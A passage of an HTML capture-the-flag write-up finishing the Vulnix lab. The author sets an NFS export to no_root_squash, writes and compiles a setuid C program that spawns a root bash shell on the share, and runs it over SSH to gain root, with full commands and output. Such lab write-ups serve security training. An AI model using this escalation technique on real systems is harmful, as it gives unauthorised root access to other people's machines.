+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">(</span>rw,no_root_squash<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        The only way to get the nfs config to update, in this instance, is to restart the machine.<br>
+        You can't restart the service or anything because you're not root.<br>
+        I didn't figure this part out. I looked it up. This is a pretty poorly designed step in the ctf in my opinion; touching the VM is generally regarded as out of bounds :/<br>
+        <br>
+        Restart the VM<br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        After the restart, we can access the nfs as root<br>
+            <div class="codebox">
+                vulnix@kali<span style="color:#ff9d00;font-weight:700">:/</span>root<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;root<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;28K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;4&nbsp;vulnix&nbsp;vulnix&nbsp;4.0K&nbsp;Apr&nbsp;13&nbsp;02<span style="color:#ff9d00;font-weight:700">:</span>18&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;4&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2012&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;vulnix&nbsp;vulnix&nbsp;&nbsp;220&nbsp;Apr&nbsp;&nbsp;3&nbsp;&nbsp;2012&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;vulnix&nbsp;vulnix&nbsp;3.5K&nbsp;Apr&nbsp;&nbsp;3&nbsp;&nbsp;2012&nbsp;.bashrc<br>
+                drwx------&nbsp;2&nbsp;vulnix&nbsp;vulnix&nbsp;4.0K&nbsp;Apr&nbsp;13&nbsp;02<span style="color:#ff9d00;font-weight:700">:</span>18&nbsp;.cache<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;vulnix&nbsp;vulnix&nbsp;&nbsp;675&nbsp;Apr&nbsp;&nbsp;3&nbsp;&nbsp;2012&nbsp;.profile<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;2&nbsp;vulnix&nbsp;vulnix&nbsp;4.0K&nbsp;Apr&nbsp;13&nbsp;02<span style="color:#ff9d00;font-weight:700">:</span>17&nbsp;.ssh
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) nfs -&gt; root</strong></h2><br>
+        Since we can access the nfs as root, we can create a suid binary as root that will give us a shell.<br>
+        Inside the nfs, create a binary that will give you a shell - <code>nano rootme.c</code> , compile it - <code>gcc rootme.c -o rootme</code> - and give it a suid bit - <code>chmod +s rootme</code><br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;nano&nbsp;rootme.c<br>
+                int&nbsp;main<span style="color:#ff9d00;font-weight:700">(</span>void<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setgid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;execl<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/bin/bash"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"bash"</span>,&nbsp;0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">gcc</span>&nbsp;rootme.c&nbsp;-o&nbsp;rootme<br>
+                rootme.c<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;In&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;‘main’<span style="color:#ff9d00;font-weight:700">:</span><br>
+                rootme.c<span style="color:#ff9d00;font-weight:700">:</span>2<span style="color:#ff9d00;font-weight:700">:</span>2<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;implicit&nbsp;declaration&nbsp;of&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;‘setgid’&nbsp;[-Wimplicit-function-declaration]<br>
+                &nbsp;&nbsp;setgid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;^~~~~~<br>
+                rootme.c<span style="color:#ff9d00;font-weight:700">:</span>3<span style="color:#ff9d00;font-weight:700">:</span>2<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;implicit&nbsp;declaration&nbsp;of&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;‘setuid’&nbsp;[-Wimplicit-function-declaration]<br>
+                &nbsp;&nbsp;setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;^~~~~~<br>
+                rootme.c<span style="color:#ff9d00;font-weight:700">:</span>4<span style="color:#ff9d00;font-weight:700">:</span>2<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;implicit&nbsp;declaration&nbsp;of&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;‘execl’&nbsp;[-Wimplicit-function-declaration]<br>
+                &nbsp;&nbsp;execl<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/bin/bash"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"bash"</span>,&nbsp;0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;^~~~~<br>
+                rootme.c<span style="color:#ff9d00;font-weight:700">:</span>4<span style="color:#ff9d00;font-weight:700">:</span>2<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;incompatible&nbsp;implicit&nbsp;declaration&nbsp;of&nbsp;built-in&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;‘execl’<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;rootme<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;16K&nbsp;Apr&nbsp;13&nbsp;&nbsp;2019&nbsp;rootme<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+s&nbsp;rootme<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;rootme<br>
+                -rwsr-sr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;16K&nbsp;Apr&nbsp;13&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>32&nbsp;rootme
+            </div>
+        </div><br>
+        <br>
+        SSH in as vulnix and run the binary.<br>
+        You'll be root!<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;-i&nbsp;sshVulnix&nbsp;vulnix@192.168.1.189<br>
+                Enter&nbsp;passphrase&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">key</span>&nbsp;'sshVulnix':&nbsp;hey<br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;12.04.1&nbsp;LTS&nbsp;(GNU/Linux&nbsp;3.2.0-29-generic-pae&nbsp;i686)<br>
+                ...<br>
+                vulnix@vulnix:~$&nbsp;pwd<br>
+                /home/vulnix<br>
+                vulnix@vulnix:~$&nbsp;ls<br>
+                rootme&nbsp;&nbsp;rootme.c<br>
+                vulnix@vulnix:~$&nbsp;./rootme<br>
+                root@vulnix:~#&nbsp;id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root),2008(vulnix)<br>
+                root@vulnix:~#&nbsp;cd&nbsp;/root<br>
+                root@vulnix:/root#&nbsp;ls<br>
+                trophy.txt
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
